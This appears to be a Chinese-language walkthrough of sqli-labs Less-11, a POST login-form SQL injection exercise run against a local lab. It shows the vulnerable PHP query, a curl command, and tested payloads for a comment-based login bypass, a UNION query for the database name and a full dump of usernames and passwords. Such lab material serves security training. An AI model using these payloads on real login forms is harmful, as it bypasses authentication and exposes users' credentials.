# Less-11

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | POST · 报错型 |
| **闭合方式** | `'` |
| **成败信号** | 数据回显 + flag.jpg |
| **一句话** | 登录框注入 |
| **核心 payload** | `uname=admin' --+` |

---

**POST · 报错型 · 单引号**

### 源码

```php
$uname  = $_POST['uname'];
$passwd = $_POST['passwd'];
$sql = "SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
```

### 特点：从 URL 转到了表单

第一关开始都是 GET，从这关开始变成 POST。用 curl 或 Burp 提交：

```bash
curl -s -X POST "http://localhost/sqli-labs-master/Less-11/" \
     --data-raw "uname=admin%27+--+&passwd=x"
```

> ⚠️ 两个坑：
> 1. **不能用 `--data-urlencode`** —— 它会把 `+` 编码成 `%2B`，`--+` 就失效了。要用 `--data-raw` 自己控制编码。
> 2. 空格要编码成 `+`，单引号写成 `%27`。上面这条 payload 解码后正好是 `admin' -- `。
>
> 嫌麻烦就用 **Burp Suite** 抓包改，或者浏览器 F12 → 网络 → 右键请求 → 编辑并重发。

### 闭合原理

```
原句：... WHERE username='$uname' and password='$passwd' LIMIT 0,1
输入 uname = admin' --+
结果：... WHERE username='admin' --+ and password='...' LIMIT 0,1
                                  ↑ 密码校验被注释掉了！
```

这就是最经典的**万能密码**：不需要知道密码，直接把密码判断注释掉。

### 通关 payload（实测）

**① 万能密码登录**
```
uname = admin' --+
passwd = 随便填
→ 成功  user=admin  pass=admin
```

**② UNION 查库名**
```
uname = -1' union select 1,database()--+
passwd = x
→ 页面显示  user=1  pass=security
```

**③ 拖库**
```
uname = -1' union select 1,group_concat(username,0x3a,password) from users--+
passwd = x
→  13 条账号密码全部显示在用户名/密码位置
```

---

[← Less-10](Less-10.md) ｜ [返回目录](README.md) ｜ [Less-12 →](Less-12.md)